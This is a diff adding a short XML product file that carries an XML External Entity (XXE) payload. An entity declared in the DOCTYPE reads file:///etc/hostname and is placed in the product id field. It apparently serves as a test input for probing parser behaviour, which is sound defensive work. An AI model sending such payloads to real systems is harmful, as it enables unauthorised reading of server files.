@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE product [
+  <!ENTITY xxe SYSTEM "file:///etc/hostname">
+]>
+<products>
+<product>
+<id>&xxe;</id>
+<name>Product One</name>
+<price>19.99</price>
+</product>
+</products>
